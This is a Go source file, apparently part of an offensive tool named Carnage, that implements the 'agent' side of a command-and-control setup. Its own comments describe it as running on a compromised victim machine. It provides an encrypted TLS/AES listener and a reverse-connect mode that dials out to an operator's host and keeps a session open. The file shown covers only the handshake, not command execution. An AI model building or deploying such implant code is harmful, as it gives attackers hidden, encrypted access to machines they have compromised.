package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/Falconmx1/Carnage/internal/transport"
	"github.com/Falconmx1/Carnage/pkg/protocol"
	"github.com/spf13/cobra"
)

var (
	agentListenPort int
	agentAdminIP    string
	agentAdminPort  int

	// agentCert se genera una vez al arrancar el comando "listen"
	// y se reutiliza en cada conexión entrante.
	agentCert tls.Certificate
)

var agentCmd = &cobra.Command{
	Use:   "agent",
	Short: "Modo Agent (víctima): escucha o conecta al Admin",
	Long: `El Agent se ejecuta en la máquina comprometida y espera instrucciones del Admin:
  - listen:  escucha conexiones del Admin con TLS + AES.
  - connect: modo inverso, se conecta al Admin.`,
}

// ---------- listen ----------

var agentListenCmd = &cobra.Command{
	Use:   "listen",
	Short: "Escuchar conexiones del Admin (TLS + AES)",
	RunE: func(cmd *cobra.Command, args []string) error {
		cert, err := transport.GenerateSelfSignedCert()
		if err != nil {
			return fmt.Errorf("error generando certificado: %w", err)
		}
		agentCert = cert // se reutiliza en handleAgentConn

		addr := fmt.Sprintf("0.0.0.0:%d", agentListenPort)
		ln, err := tls.Listen("tcp", addr, &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS13,
		})
		if err != nil {
			return fmt.Errorf("error escuchando en %s: %w", addr, err)
		}
		defer ln.Close()
		fmt.Printf("[+] Agent escuchando en %s (TLS 1.3)\n", addr)

		ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
		defer cancel()

		go func() {
			<-ctx.Done()
			ln.Close()
		}()

		for {
			conn, err := ln.Accept()
			if err != nil {
				select {
				case <-ctx.Done():
					return nil
				default:
					fmt.Printf("[-] Error aceptando conexión: %v\n", err)
					continue
				}
			}
			go handleAgentConn(conn)
		}
	},
}

// handleAgentConn atiende una conexión entrante del Admin.
// Hace el handshake TLS+AES, lee el mensaje del protocolo, lo descifra
// y responde con un HandshakeOK cifrado.
func handleAgentConn(conn net.Conn) {
	defer conn.Close()

	wrapped, gcm, err := transport.ServerHandshake(conn, agentCert)
	if err != nil {
		fmt.Printf("[-] Error en handshake con %s: %v\n", conn.RemoteAddr(), err)
		return
	}
	defer wrapped.Close()

	// 1. Leer el tipo de mensaje (1 byte)
	wrapped.SetReadDeadline(time.Now().Add(10 * time.Second))
	header := make([]byte, 1)
	if _, err := wrapped.Read(header); err != nil {
		fmt.Printf("[-] Error leyendo tipo de mensaje: %v\n", err)
		return
	}
	msgType := protocol.MessageType(header[0])

	// 2. Leer el payload cifrado (AES-GCM incluye nonce + ciphertext)
	encBuf := make([]byte, 4096)
	n, err := wrapped.Read(encBuf)
	if err != nil {
		fmt.Printf("[-] Error leyendo payload: %v\n", err)
		return
	}

	// 3. Descifrar
	plaintext, err := transport.Decrypt(gcm, encBuf[:n])
	if err != nil {
		fmt.Printf("[-] Error descifrando payload: %v\n", err)
		return
	}

	fmt.Printf("[+] Admin conectado desde %s: tipo=%s payload=%q\n",
		conn.RemoteAddr(), msgType, string(plaintext))

	// 4. Responder con HandshakeOK cifrado
	resp := protocol.NewHandshakeOK()
	encResp, err := transport.Encrypt(gcm, resp.Payload)
	if err != nil {
		fmt.Printf("[-] Error cifrando respuesta: %v\n", err)
		return
	}
	packet := make([]byte, 0, 1+len(encResp))
	packet = append(packet, byte(resp.Type))
	packet = append(packet, encResp...)
	if _, err := wrapped.Write(packet); err != nil {
		fmt.Printf("[-] Error enviando respuesta: %v\n", err)
		return
	}
}

// ---------- connect ----------

var agentConnectCmd = &cobra.Command{
	Use:   "connect",
	Short: "Conectar al Admin (modo inverso)",
	RunE: func(cmd *cobra.Command, args []string) error {
		addr := net.JoinHostPort(agentAdminIP, fmt.Sprintf("%d", agentAdminPort))

		rawConn, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			return fmt.Errorf("error conectando al admin %s: %w", addr, err)
		}

		conn, gcm, err := transport.ClientHandshake(rawConn)
		if err != nil {
			rawConn.Close()
			return fmt.Errorf("error en handshake con %s: %w", addr, err)
		}
		defer conn.Close()

		// Enviar handshake cifrado
		hs := protocol.NewHandshake("carnage-agent")
		enc, err := transport.Encrypt(gcm, hs.Payload)
		if err != nil {
			return fmt.Errorf("error cifrando handshake: %w", err)
		}
		packet := make([]byte, 0, 1+len(enc))
		packet = append(packet, byte(hs.Type))
		packet = append(packet, enc...)
		if _, err := conn.Write(packet); err != nil {
			return fmt.Errorf("error enviando handshake: %w", err)
		}

		// Esperar respuesta
		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		buf := make([]byte, 4096)
		n, err := conn.Read(buf)
		if err != nil {
			return fmt.Errorf("error leyendo respuesta: %w", err)
		}
		fmt.Printf("[+] Conectado al Admin %s. Respuesta (%d bytes): %x\n", addr, n, buf[:n])
		fmt.Println("[+] Sesión activa. Ctrl+C para salir.")
		waitForSignal()
		return nil
	},
}
